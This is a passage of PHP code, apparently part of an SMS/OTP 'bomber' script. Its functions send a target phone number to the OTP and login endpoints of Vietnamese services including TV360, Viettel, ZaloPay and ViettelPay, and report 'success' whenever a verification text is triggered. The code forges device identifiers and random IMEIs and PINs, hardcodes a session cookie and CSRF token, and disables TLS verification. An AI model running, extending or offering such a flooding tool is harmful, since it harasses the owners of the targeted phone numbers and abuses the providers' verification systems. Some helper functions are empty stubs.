		CURLOPT_CUSTOMREQUEST => "POST",
		CURLOPT_COOKIE => "img-ext=avif; session-id=s%3A80c6fbad-d7e1-4dac-92a6-6cb5897bcf98.vnOf3K%2B010rNLX1ydurEP6VbvWURhbu4yAmsZ7EoxqQ; device-id=s%3Awap_649b61fe-eafa-4467-a902-894759722239.Z3iCDzH0lKHxKMRhPojvaWT%2BOFwOmZpVB11XnqALrJM; screen-size=s%3A385x854.YsJCQUjKOJSkUOYLfVhMNjngvj0EBsElrxhbkBkUaj0; access-token=; refresh-token=; msisdn=; profile=; user-id=; auto-login=1; G_ENABLED_IDPS=google",
		CURLOPT_ENCODING => "",
		CURLOPT_POST => TRUE,
		CURLOPT_HTTPHEADER => $head,
		CURLOPT_POSTFIELDS => $data,
		CURLOPT_RETURNTRANSFER => 1,
		CURLOPT_SSL_VERIFYHOST => FALSE,
		CURLOPT_SSL_VERIFYPEER => FALSE,
		CURLOPT_TIMEOUT => 60,
		CURLOPT_CONNECTTIMEOUT => 60,
		CURLOPT_FOLLOWLOCATION => TRUE,
	));
	$access = json_decode(curl_exec($ch),true); 
	if($access["errorCode"] == 200){
		return array("tv360" => "Thành Công");
	} else {
		return array("tv360" => "Thất Bại");
	}
}
function VIETTELL($sdt){
	$head = array(
		"Host: vietteltelecom.vn",
		"Connection: keep-alive",
		"X-XSRF-TOKEN: ",
		"X-CSRF-TOKEN: mXy4RvYExDOIR62HlNUuGjVUhnpKgMA57LhtHQ5I",
		"sec-ch-ua-mobile: ?1",
		"User-Agent: Mozilla/5.0 (Linux; Android 10; RMX3063) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
		"Content-Type: application/json;charset=UTF-8",
		"Accept: application/json, text/plain, */*",
		"Referer: https://vietteltelecom.vn/dang-nhap",
	);
	$data = array(
		"phone" => $sdt,
		"type" => ""
	);
	$GET = json_decode(_curl("POST", "https://vietteltelecom.vn/api/get-otp-login", json_encode($data), $head),true);
	if($GET["code"] == 200){
		return array("VIETTEL" => "Thành Công");
	} else {
		return array("VIETTEL" => "Thất Bại");
	}
}
function _curl($method, $url, $data, $head){
	$ch = curl_init();
		curl_setopt_array($ch, array(
			CURLOPT_URL => $url,
			CURLOPT_CUSTOMREQUEST => $method,
			CURLOPT_ENCODING => '',
			CURLOPT_POST => TRUE,
			CURLOPT_HTTPHEADER => $head,
			CURLOPT_POSTFIELDS => $data,
			CURLOPT_RETURNTRANSFER => 1,
			CURLOPT_FOLLOWLOCATION => TRUE
		));
	$access = curl_exec($ch); 
	return $access;
}
function ZALOPAY($sdt) {
	$head = array(
		"Host: api.zalopay.vn",
		"x-platform: NATIVE",
		"x-device-os: ANDROID",
		"x-device-id: 690354367d96c358",
		"x-device-model: Samsung SM-A217F",
		"x-app-version: 7.16.0",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36 ZaloPay Android / 9881",
		"x-density: xhdpi",
		"authorization: Bearer",
		"x-drsite: off",
		"accept-encoding: gzip",
	);
	$ch = curl_init();
	curl_setopt_array($ch, array(
		CURLOPT_URL => "https://api.zalopay.vn/v2/account/phone/status?phone_number=".$sdt,
		CURLOPT_CUSTOMREQUEST => "GET",
		CURLOPT_ENCODING => '',
		CURLOPT_POST => TRUE,
		CURLOPT_HTTPHEADER => $head,
		CURLOPT_RETURNTRANSFER => 1,
		CURLOPT_SSL_VERIFYHOST => FALSE,
		CURLOPT_SSL_VERIFYPEER => FALSE,
		CURLOPT_TIMEOUT => 60,
		CURLOPT_CONNECTTIMEOUT => 60,
		CURLOPT_FOLLOWLOCATION => TRUE,
	));
	$get = json_decode(curl_exec($ch),true);
	$token = $get["data"]["send_otp_token"];
	$data = '{"phone_number":"'.$sdt.'","send_otp_token":"'.$token.'"}';
	curl_setopt_array($ch, array(
		CURLOPT_URL => "https://api.zalopay.vn/v2/account/otp",
		CURLOPT_CUSTOMREQUEST => "POST",
		CURLOPT_HTTPHEADER => $head,
		CURLOPT_POSTFIELDS => $data,
		CURLOPT_RETURNTRANSFER =>1,
	));
	$get = json_decode(curl_exec($ch),true);
	if($get["error"] == 1){
		return array("ZaloPay" => "Thất Bại");
	} else {
		return array("ZaloPay" => "Thành Công");
	}
}
function VTPAY($sdt){
	$head = array(
		"Host: api8.viettelpay.vn",
		"product: VIETTELPAY",
		"accept-language: vi",
		"authority-party: APP",
		"channel: APP",
		"type-os: android",
		"app-version: 5.1.4",
		"os-version: 10",
		"imei: "."VTP_".strtoupper(generateRandomString(32)),
		"x-request-id: ".date("YmdHis"),
		"content-type: application/json; charset=UTF-8",
		"user-agent: okhttp/4.2.2"
	);
	$data = array(
		"type" => "msisdn",
		"username" => $sdt
	);
	$GET = json_decode(_curl("POST", "https://api8.viettelpay.vn/customer/v1/validate/account", json_encode($data), $head),true);
	if ($GET["status"]["code"] == "CS9901") {
		$data = array(
			"hash" => "",
			"identityType" => "msisdn",
			"identityValue" => $sdt,
			"imei" => "VTP_".strtoupper(generateRandomString(32)),
			"notifyToken" => "",
			"otp" => "android",
			"pin" => "VTP_".strtoupper(generateRandomString(32)),
			"transactionId" => "",
			"type" => "REGISTER",
			"typeOs" => "android",
			"verifyMethod" => "sms"
		);
		$GET = json_decode(_curl("POST", "https://api8.viettelpay.vn/customer/v2/accounts/register", json_encode($data), $head),true);
	} else {
		$data = array(
			"imei" => "VTP_".strtoupper(generateRandomString(32)),
			"loginType" => "BASIC",
			"msisdn" => $sdt,
			"otp" => "",
			"pin" => "VTP_".strtoupper(generateRandomString(32)),
			"requestId" => "",
			"typeOs" => "android",
			"userType" => "msisdn",
			"username" => $sdt
		);
		$GET = json_decode(_curl("POST", "https://api8.viettelpay.vn/auth/v1/authn/login", json_encode($data), $head),true);
	}
	//print_r($GET);
	if($GET["status"]["message"] == "Cần xác thực bổ sung OTP" or $GET["status"]["message"] == "Vui lòng nhập mã OTP được gửi về SĐT ".$sdt." để xác minh chính chủ"){
		return array(
			"VTPAY" => "Thành công"
		);
	} else {
		return array(
			"VTPAY" => "Thất Bại"
		);
	}
}
function generateImei() {
	
}
function generateRandomString($len) {
}